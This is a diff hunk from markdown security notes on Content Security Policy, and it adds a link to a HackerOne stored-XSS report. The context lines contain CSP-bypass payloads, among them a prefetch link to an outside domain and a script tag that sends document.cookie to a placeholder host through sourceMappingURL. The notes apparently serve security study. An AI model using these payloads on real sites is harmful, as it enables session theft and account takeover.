@@ -624,6 +624,7 @@ Mitigations:
         - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
         - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
             - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)
+    - [#662287 Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287)
 - Checksum for requested resources (e.g. CDN .js)
     - https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
 
